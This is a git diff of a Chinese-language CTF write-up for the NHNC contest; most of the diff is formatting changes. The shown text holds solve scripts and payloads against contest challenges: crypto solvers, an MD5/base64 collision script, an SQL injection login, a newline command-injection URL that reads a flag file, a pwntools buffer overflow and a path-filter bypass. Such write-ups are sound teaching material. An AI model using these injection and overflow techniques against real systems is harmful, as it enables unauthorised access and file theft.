@@ -6,15 +6,15 @@ tags: ["Cybersec","writeup"]
 category: CTF
 draft: false
 ---
-![image](https://hackmd.io/_uploads/rkGxWW_MJg.png)
 
-[TOC]
+![image](https://hackmd.io/_uploads/rkGxWW_MJg.png)
 
 
 # Misc
 ## "A Gift from the Leader Organizer" (1 pt)
 ![image](https://hackmd.io/_uploads/rJGfy8FzJl.png)
 總召大人最帥了😘
+
 > NHNC{fishbaby1011sohandsome}
 ## Blog 2 (20 pts)
 ```
@@ -51,6 +51,7 @@ draft: false
 
 把後面的照片連結去掉，即可進入Blog 3
 ![Screenshot 2024-11-18 080559](https://hackmd.io/_uploads/r1ZBSWuf1x.png)
+
 > NHNC{image_url}
 
 ## Where is this (20 pts)
@@ -77,6 +78,7 @@ ex:NHNC{12.345_114.514}
 
 右鍵即可看到經緯度資訊
 ![image](https://hackmd.io/_uploads/H1MzO-_fyx.png)
+
 > NHNC{24.802_120.979}
 
 ## NHNC, but C0LoRfUl (39 pts)
@@ -150,6 +152,7 @@ output: TkdU8sqjliuakA+nj2aEmbDf+AaJwASfPuooaKadCqg=
 
 隨便找個AES online decryption，選CBC mode
 ![image](https://hackmd.io/_uploads/BJBqcMOfke.png)
+
 > NHNC{Y0u_kn0w_AES}
 
 ## Baby RSA (40 pts)
@@ -186,12 +189,16 @@ leak=409806027984142046827568136516718279278250684987305418639665531440726724145
 $n = p \cdot q \cdot r$<br>
 $leak = pq + qr + rp - p - q - r$<br>
 
-這樣，我們就可以開始計算$\varphi (n)$:<br>
-$\varphi (n) = (p - 1)  (q - 1)  (r - 1)$<br>
-展開:<br>
+這樣，我們就可以開始計算$\varphi (n)$:
+
+$\varphi (n) = (p - 1)  (q - 1)  (r - 1)$
+
+展開:
+
 $\varphi (n) = pqr - pq - pr - qr + p + q + r - 1$
 
-`n`和`leak`帶入$\varphi (n)$可得:<br>
+`n`和`leak`帶入$\varphi (n)$可得:
+
 $\varphi (n)=n - \text{leak} - 1$
 
 exploit:
@@ -209,6 +216,7 @@ m = pow(c, d, n)
 flag = long_to_bytes(m)
 print(flag)
 ```
+
 > NHNC{baby_math_won}
 
 ## Secret ROT13 (40 pts)
@@ -245,10 +253,10 @@ output.txt:
 VZRU{Y0k_yd0w_Z0o_ti_rsslyxli}
 ```
 
-每個字元的加密是基於其位置 `i` 和給定的密鑰 `key`<br
+每個字元的加密是基於其位置 `i` 和給定的密鑰 `key`
 $\text{offset} = ((i + 1 + \text{key}) \times (i + 1)) \% 26$
 
-反向操作，把`offset`減掉，然後還原到對應的ASCII範圍<br>
+反向操作，把`offset`減掉，然後還原到對應的ASCII範圍
 
 最後暴力找`key`
 
@@ -274,6 +282,7 @@ for i in range(1, 26):
 └─$ python3 epx_rot13.py | grep NHNC
 NHNC{Y0u_kn0w_H0w_to_decrypte}
 ```
+
 > NHNC{Y0u_kn0w_H0w_to_decrypte}
 
 ## Ande Yo Caliente (60 pts)
@@ -307,13 +316,18 @@ eab3ee7a3821847b76558eb61ec26f4fc7f72f436966ab7680d652b872c85c0bae4879db0748b02d
 f393c557632f836f226c828c1e87634489fa2e7d7b38e477b0d14dfa66
 '''
 ```
-這題給了一個明文的message/加密過的message，還有加密過的flag，以及加密兩者的`IV`(ChaCha20的`nonce`)<br>
-但ChaCha20的加密法是生成一個keystream再XOR<br>
-$\text{ciphertext} = \text{keystream} \oplus \text{text}$<br>
-所以其實不用`IV`也沒差?<br>
+這題給了一個明文的message/加密過的message，還有加密過的flag，以及加密兩者的`IV`(ChaCha20的`nonce`)
 
-所以就利用XOR的特性，用給定的明/密文得到keystream<br>
+但ChaCha20的加密法是生成一個keystream再XOR
+
+$\text{ciphertext} = \text{keystream} \oplus \text{text}$
+
+所以其實不用`IV`也沒差?
+
+所以就利用XOR的特性，用給定的明/密文得到keystream
+
 再用keystream解flag
+
 exploit:
 ```python=
 from Crypto.Cipher import *
@@ -399,14 +413,17 @@ if __name__ == '__main__':
     app.run(host="0.0.0.0", port=31337)
 ```
 
-他會接收一個長度為100的`data`<br>
-然後`data`裡面包含一個list，裡面放兩個Base64編碼過的字串<br>
+他會接收一個長度為100的`data`
+
+然後`data`裡面包含一個list，裡面放兩個Base64編碼過的字串
+
 最後做驗證:
 - 沒有重複的Base64字串
 - Base64解碼後必須包含`whale_meowing`
 - List內兩個字串MD5雜湊過必須要一樣
 
-~~然後透過ChatGPT~~，發現Base64有個特性:解碼時會忽略空格、`!`、`-`等不支援的字元<br>
+~~然後透過ChatGPT~~，發現Base64有個特性:解碼時會忽略空格、`!`、`-`等不支援的字元
+
 稍微實驗一下:
 ```python
 >>> base64.b64decode("YWJj".encode())
@@ -420,7 +437,7 @@ b'abc'
 >>> base64.b64decode("Y!W\nJ~ j_.-".encode())
 b'abc'
 ```
-真的ㄟ，好扯ㄛ<br>
+真的ㄟ，好扯ㄛ
 
 這樣就可以寫exploitㄌ:
 ```python=
@@ -454,6 +471,7 @@ for i in range(100):
 response = requests.post(url, json=data)
 print(response.json())
 ```
+
 > NHNC{is_md_an_abbreviation_for_maid?}
 
 # Web
@@ -468,6 +486,7 @@ Link:https://nhnc-ctf-frank.dypc.cc/
 
 直接View page source
 ![image](https://hackmd.io/_uploads/BJSauGuMJl.png)
+
 > NHNC{BeCareful!}
 
 
@@ -480,7 +499,8 @@ http://23.146.248.227:60001/
 用browser打開
 ![image](https://hackmd.io/_uploads/HJvOTcdf1x.png)
 
-推測應該要用不同的method，結合提敘，推測用`PUT`<br>
+推測應該要用不同的method，結合提敘，推測用`PUT`
+
 用curl抓下來
 ```bash
 └─$ curl -X PUT http://23.146.248.227:60001/
@@ -498,6 +518,7 @@ http://23.146.248.227:60001/
     <p><strong>FLAG: NHNC{Y0u_kn0w_H0w_t0_us3_CURL}</strong></p></body>
 </html>
 ```
+
 > NHNC{Y0u_kn0w_H0w_t0_us3_CURL}
 
 ## I need to get the C00kies (100 pts)
@@ -517,7 +538,7 @@ http://chal.nhnc.ic3dt3a.org:60002/
 右鍵Edit Value改admin，Reload Page
 ![image](https://hackmd.io/_uploads/S1l5d2OG1l.png)
 
->NHNC{You_Kn0w_H0w_t0_chang3_th3_c00ki3}
+> NHNC{You_Kn0w_H0w_t0_chang3_th3_c00ki3}
 
 ## Login (100 pts)
 ```
@@ -535,7 +556,7 @@ http://chal.nhnc.ic3dt3a.org:60003/
 ...然後就打進去了XDDD
 ![image](https://hackmd.io/_uploads/SyV2i3OM1e.png)
 
-`NHNC{S1mp|e_-_SQL!}`
+> NHNC{S1mp|e_-_SQL!}
 
 ## 1 line php (300 pts)
 ```
@@ -557,6 +578,7 @@ flag的檔案是`flag-`
 
 payload:
 `http://chal.nhnc.ic3dt3a.org:60000/?cmd=%0A%20cat%20/flag-`
+
 > NHNC{enter_is_always_the_best}
 
 ## Democracy (350 pts)
@@ -738,6 +760,7 @@ No more hint because it is so eazyyyyyyyyy
 ```
 VV進去:
 ![image](https://hackmd.io/_uploads/HyJq6mdGJe.png)
+
 > NHNC{this_is_a_easy_one}
 
 ## Guess the num (200 pts)
@@ -749,6 +772,7 @@ VV進去:
 [file link](https://nhnc.ic3dt3a.org/files/c8ca6ecc673f41a29cf097dd79c14256/guess_the_num?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6MTd9.Zzqt1w.dXtqu9YRYdFW-NEfPFpj7o7lfeU)
 
 這邊用IDA打開
+
 main函式裡:
 ```c=
   srand(0x1234u);
@@ -766,7 +790,9 @@ main函式裡:
   }
 ```
 `flag`是在全域變數，直接點開看是`NHNC{as_clear_as_plaintext}`
+
 但提交是顯示錯誤，回去看看有那些函式
+
 發現了`sub_1217()`，裡面有存取到`flag`讓我很在意:
 ```c=
 _BYTE *sub_1217()
@@ -828,6 +854,7 @@ int main() {
     return 0;
 }
 ```
+
 > NHNC{traced_down_to_dtor}
 
 
@@ -854,7 +881,9 @@ case 'S':
     }  
 ```
 原本在想要怎麼用buffer overflow蓋掉`is_admin`，但發現初始值是`1234`
+
 我:???
+
 所以exploit很簡單:
 ```python=
 from pwn import *
@@ -876,6 +905,7 @@ $ cat flag
 NHNC{i_dont_think_you_are_a_teacher}
 exit
 ```
+
 > NHNC{i_dont_think_you_are_a_teacher}
 
 ## DOF (100 pts)
@@ -915,13 +945,19 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 看到`gets()`和題敘就可以猜到是buffer overflow了
+
 目前`main`裡的目標是進入`secret_d00r()`
+
 所以要想辦法用BOF蓋掉`v7`
+
 然後我比較喜歡看上面IDA給的註解:
-`v9 [rbp-8h]`
-`v8 [rbp-12h]`
-`v7 [rbp-20h]`
+```c=
+v9 [rbp-8h]
+v8 [rbp-12h]
+v7 [rbp-20h]
+```
 蓋掉`v9`+`v8`(0x12)，後面接上`cat_sleeping`
+
 接著就可以進入`secret_d00r`:
 ```c=
 int secret_d00r()
@@ -968,7 +1004,9 @@ int secret_d00r()
 }
 ```
 可以看出當`dest`內含有"pwn3d!!!"字串，就可以看到flag了
+
 值得注意的是，`v7`和`dest`在執行時有用`malloc()`動態分配空間
+
 我因為怕計算錯誤，寫了個C code模擬看到空間計算offset:
 ```c=
 #include <stdio.h>
@@ -1025,7 +1063,9 @@ nc chal.nhnc.ic3dt3a.org 2002
 source code很長，就不放了
 
 最剛開始時，exploit code有放在給的zip檔內
+
 但他們發現時已經有5個人解了
+
 ~~很幸運我在那5個人之中~~
 
 所以我在這邊就講講他的 exploit:
@@ -1045,6 +1085,7 @@ log.info(flag)
 p.close()
 ```
 簡單來說，我們要透過`read_file`來得到flag
+
 選單按`L`可以看到底下的內容:
 ```
 Your choice> L
@@ -1058,6 +1099,7 @@ chal
 gallery/
 ```
 然後在source可以看到，`R`選項是用於read file
+
 並且在`S`做Set category時對`classified`有過濾
 ```c=
 case 'S':
@@ -1074,9 +1116,11 @@ case 'S':
 回去看到exploit，輸入順序為:`S` -> `.` -> `R` -> `/home/chal/classified/flag`
 
 前面`S`先用`.`，代表的是當前目錄，用來繞過`..` / `/` / `classified`
+
 後面`R`再設定絕對路徑`/home/chal/classified/flag`
 
 串接後，完整的系統查詢路徑就變成:`./home/chal/classified/flag`
 
 提交exploit:
+
 > NHNC{sneaked_into_forbidden_zone}
